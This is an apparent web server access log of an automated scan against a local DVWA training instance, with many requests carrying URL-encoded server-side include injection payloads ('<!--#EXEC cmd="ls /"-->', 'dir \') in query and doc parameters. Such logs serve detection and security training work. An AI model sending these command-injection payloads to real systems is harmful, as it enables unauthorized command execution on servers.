172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 301 614 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa/?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 301 632 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /dvwa/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /docs/DVWA_v1.3.pdf?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/login.css?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/login.css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 301 638 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/login.css?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 301 622 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/login.css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 301 659 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/main.css?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/main.css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/main.css?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/css/main.css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 301 644 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 301 628 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 301 646 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/login_logo.png?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/logo.png?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/login_logo.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/logo.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/login_logo.png?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/logo.png?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/login_logo.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/logo.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/RandomStorm.png?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/spanner.png?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/spanner.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/RandomStorm.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/spanner.png?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/RandomStorm.png?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/spanner.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/images/RandomStorm.png?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 301 618 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 301 636 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/add_event_listeners.js?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/add_event_listeners.js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 301 620 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/add_event_listeners.js?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/add_event_listeners.js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 301 638 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:17 +0000] "GET /dvwa/js/?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /dvwa/js/dvwaPage.js?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /favicon.ico?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /dvwa/js/dvwaPage.js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /dvwa/js/dvwaPage.js?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /favicon.ico?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /dvwa/js/dvwaPage.js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /favicon.ico?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /favicon.ico?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?doc=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?doc=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?doc=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /instructions.php?doc=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:18 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
